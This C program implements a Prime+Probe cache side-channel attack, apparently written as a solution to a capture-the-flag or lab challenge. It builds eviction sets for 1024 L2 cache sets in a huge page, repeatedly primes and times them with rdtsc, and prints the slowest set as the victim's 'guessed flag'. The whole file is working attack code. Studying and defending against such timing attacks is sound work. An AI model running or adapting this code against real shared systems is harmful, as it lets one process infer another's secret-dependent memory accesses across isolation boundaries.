#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

#define NUM_L2_CACHE_SETS 1024
#define WAYS 4
#define REPEATS 20000
#define THRESHOLD 100

// Read timestamp counter
static inline uint64_t rdtsc() {
    unsigned int lo, hi;
    asm volatile ("mfence\nlfence\nrdtsc" : "=a"(lo), "=d"(hi));
    return ((uint64_t)hi << 32) | lo;
}

// Allocate a 2MB huge page
char* get_buffer() {
    size_t size = 2 * 1024 * 1024;

    char *buf = mmap(NULL, size, PROT_READ | PROT_WRITE,
                     MAP_ANONYMOUS | MAP_PRIVATE | MAP_HUGETLB | MAP_POPULATE,
                     -1, 0);

    if (buf == (void*)-1) {
        perror("mmap buffer");
        exit(1);
    }

    *((char*)buf) = 1;
    return buf;
}

// Build eviction set for one cache set
void get_partial_eviction_set(char *buf, char *eviction_set[WAYS], int set_index) {

    for (int i = 0; i < WAYS; i++) {
        eviction_set[i] = buf + (set_index << 6) + (i << 16);
    }
}

int main() {

    char *buf = get_buffer();
    char *eviction_sets[NUM_L2_CACHE_SETS][WAYS];

    for (int i = 0; i < NUM_L2_CACHE_SETS; i++)
        get_partial_eviction_set(buf, eviction_sets[i], i);

    printf("Attacker ready. Prime+Probe starting...\n");

    volatile char tmp;

    while (1) {

        uint64_t scores[NUM_L2_CACHE_SETS] = {0};

        for (int r = 0; r < REPEATS; r++) {

            // PRIME
            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {
                for (int j = 0; j < WAYS; j++) {
                    tmp = *(eviction_sets[set][j]);
                }
            }

            asm volatile("mfence; lfence");

            // Give victim time
            usleep(5000);

            // PROBE
            for (int set = 0; set < NUM_L2_CACHE_SETS; set++) {

                uint64_t start = rdtsc();

                 for (int j = 0; j < WAYS; j++) {
                    tmp = *(eviction_sets[set][j]);
                }

                uint64_t end = rdtsc();

                scores[set] += (end - start);
            }
        }

        int guessed_flag = -1;
        uint64_t max_score = 0;

        for (int i = 0; i < NUM_L2_CACHE_SETS; i++) {

            uint64_t avg = scores[i] / REPEATS;

            if (avg > max_score) {
                max_score = avg;
                guessed_flag = i;
            }
        }

        printf("Guessed flag: %d (latency=%lu)\n", guessed_flag, max_score);
        fflush(stdout);

        usleep(300000);
    }

    return 0;
}